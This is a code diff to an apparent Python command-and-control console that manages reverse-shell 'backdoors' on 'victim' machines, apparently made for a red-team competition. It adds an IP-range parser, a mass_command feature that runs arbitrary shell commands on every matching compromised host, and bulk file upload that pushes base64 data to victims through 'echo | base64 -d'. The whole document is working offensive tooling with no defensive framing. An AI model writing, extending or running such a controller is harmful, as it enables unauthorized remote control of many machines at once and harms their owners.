@@ -10,6 +10,8 @@ import os
 import aiochannel
 import subprocess
 import aioconsole
+import ipaddress
+import payload
 from typing import Optional
 import base64  
 SERVER_HOST = "0.0.0.0"
@@ -22,11 +24,50 @@ engine = None
 metadata = None
 conn = None
 
+def ip_range_parser(ip_range_string):
+    #supported formats:
+    #192.168.*.3
+    #192.168.1.*
+    #192.168.1-225.*
+    octets = ip_range_string.split(".")
+    if len(octets) != 4:
+        return None
+    if octets[0] == "*":
+        octets[0] = "0-255"
+    if octets[1] == "*":
+        octets[1] = "0-255"
+    if octets[2] == "*":
+        octets[2] = "0-255"
+    if octets[3] == "*":
+        octets[3] = "0-255"
+    octets_possible = []
+    for octet in octets:
+        if "-" in octet:
+            octet_range = octet.split("-")
+            if len(octet_range) != 2:
+                return None
+            octets_possible.append(list(range(int(octet_range[0]), int(octet_range[1]) + 1)))
+        else:
+            octets_possible.append([int(octet)])
+    ips = []
+    if len(octets_possible[0]) * len(octets_possible[1]) * len(octets_possible[2]) * len(octets_possible[3]) > 10000:
+        print("Too many IPs to scan, please narrow your range")
+        return None
+    for octet0 in octets_possible[0]:
+        for octet1 in octets_possible[1]:
+            for octet2 in octets_possible[2]:
+                for octet3 in octets_possible[3]:
+                    ips.append(ipaddress.ip_address(str(octet0) + "." + str(octet1) + "." + str(octet2) + "." + str(octet3)))
+    return ips
+    
+
 class ReverseShellManager:
     def __init__(self):
         self.backdoors = {}
     def list_backdoors(self):
-        return list(self.backdoors.keys())
+        return sorted(self.backdoors.keys())
+    def backdoor_index_to_key(self, index):
+        return sorted(self.backdoors.keys())[index]
     async def read(self, backdoor)-> Optional[bytes]:
         if backdoor not in self.backdoors:
             return None
@@ -52,8 +93,11 @@ class ReverseShellManager:
                 data = f.read()
                 #encode the file to base64
                 data = base64.b64encode(data)
+                #create the directory if it doesn't exist
+                self.backdoors[backdoor][1].write(f"mkdir -p {directory}\n".encode())
                 #echo the file to the backdoor with a base64 decode command
-                self.backdoors[backdoor][1].write(f"echo {data.decode()} | base64 -d > {directory}/{filename}\n".encode())
+                bname = os.path.basename(filename)
+                self.backdoors[backdoor][1].write(f"echo {data.decode()} | base64 -d > {directory}/{bname}\n".encode())
                 await self.backdoors[backdoor][1].drain()
                 return True
         except Exception as e:
@@ -81,7 +125,8 @@ class ReverseShellManager:
             print(f"Error decoding file: {e}")
             return False
         #write the file
-        with open(f"{directory}/{filename}", 'wb') as f:
+        bname = os.path.basename(filename)
+        with open(f"{backdoor}_{bname}", 'wb') as f:
             f.write(data)
         return True
         
@@ -102,7 +147,7 @@ class ReverseShellManager:
     async def __handle_backdoor__(self, reader, writer):
         print(colored(f"New backdoor connection from {writer.get_extra_info('peername')[0]}:{writer.get_extra_info('peername')[1]}", 'green'))
         remote = writer.get_extra_info('peername')[0] + ":" + str(writer.get_extra_info('peername')[1])
-        self.backdoors[remote] = (reader, writer)
+        self.backdoors[remote] = (reader, writer, { "os" : "unknown", "user" : "unknown" })
         #await it closing
         await self.backdoors[remote][1].wait_closed()
 
@@ -118,6 +163,7 @@ def list_victims(conn, victims):
     print("Victims:")
     print("\tID:\tIP:\t\tComment:\t")
     print("--------------------------------------------------")
+
     for victim in victims_result:
         #print bullet point
         print(colored("*", 'red'), end='\t')
@@ -130,12 +176,16 @@ def list_backdoors(rsm):
     backdoors = rsm.list_backdoors()
     # Print the results
     print("Backdoors:")
-    print("\tOrigin:\t\t\t")
+    print("Index\t\tOrigin:\t\tMetadata:\t")
     print("--------------------------------------------------")
+    index = 0
     for backdoor in backdoors:
         #print bullet point
         print(colored("*", 'red'), end='\t')
-        print(colored(f"{backdoor}", 'green'))
+        print(colored(f"{index}", 'green'), end='\t')
+        print(colored(f"{backdoor}", 'green'), end='\t')
+        print(colored(f"{rsm.backdoors[backdoor][2]}", 'yellow'), end='\n')
+        index += 1
     if len(backdoors) == 0:
         print(colored("*", 'red'), end='\t')
         print(colored("No backdoors connected", 'yellow'))
@@ -208,6 +258,32 @@ Go C3T, Beat Airforce
             print("Available commands: help, exit")
         elif command[0] == "exit":
             break
+        elif command[0] == "mass_command":
+            if len(command) < 2:
+                print("Usage: mass_command (target ip glob range) (command) ...")
+                continue
+            #parse the ip range
+            ips = ip_range_parser(command[1])
+            if ips is None:
+                print("Invalid IP range")
+                continue
+            #get all the backdoors that match the ip range
+            backdoors = []
+            for ip in ips:
+                for backdoor in rsm.list_backdoors():
+                    if backdoor.startswith(str(ip)):
+                        backdoors.append(backdoor)
+            if len(backdoors) == 0:
+                print("No backdoors match the given IP range")
+                continue
+            #run the command on all the backdoors
+            for backdoor in backdoors:
+                print(f"Running command on {backdoor}")
+                result = await rsm.write(backdoor, " ".join(command[2:]).encode())
+                if not result:
+                    print(f"Error running command on {backdoor}")
+                else:
+                    print(f"Command successfully run on {backdoor}")
         elif command[0] == "list" or command[0] == "ls" or command[0] == "show":
             list_victims(conn, victims)
         elif command[0] == "new" or command[0] == "add" or command[0] == "create":
@@ -245,7 +321,6 @@ Go C3T, Beat Airforce
                     read_bytes = await rsm.read(selection)
                     if read_bytes is None:
                         break
-                    print("read_bytes")
                     print(read_bytes.decode(), end="")
             async def write():
                 while True:
@@ -269,20 +344,31 @@ Go C3T, Beat Airforce
                 task.cancel()
         elif command[0] == "upload":
             if len(command) < 3:
-                print("Usage: upload (shell_ip:shell_port) (filename)")
+                print("Usage: upload (ip glob) (filename)")
                 continue
             if len(rsm.backdoors) == 0:
                 print("No reverse shells connected")
                 continue
-            if command[1] not in rsm.list_backdoors():
-                print("Invalid selection, pick one of the following:")
-                list_backdoors(rsm)
+            ranges = ip_range_parser(command[1])
+            if ranges is None:
+                print("Invalid IP range")
                 continue
-            selection = command[1]
-            if not await rsm.upload(selection, command[2]):
-                print("Error uploading file")
-            else:
-                print("File uploaded successfully")
+            backdoors = []
+            for ip in ranges:
+                for backdoor in rsm.list_backdoors():
+                    if backdoor.startswith(str(ip)):
+                        print(f"Found backdoor {backdoor}")
+                        backdoors.append(backdoor)
+            if len(backdoors) == 0:
+                print("No backdoors match the given IP range")
+                continue
+            if len(backdoors) > 0:
+                for index, backdoor in enumerate(backdoors):
+                    print(f"{index}: {backdoor}")
+                    if not await rsm.upload(backdoor, command[2]):
+                        print("Error uploading file")
+                    else:
+                        print("File uploaded successfully")
         elif command[0] == "download":
             if len(command) < 3:
                 print("Usage: download (shell_ip:shell_port) (filename) [directory]")
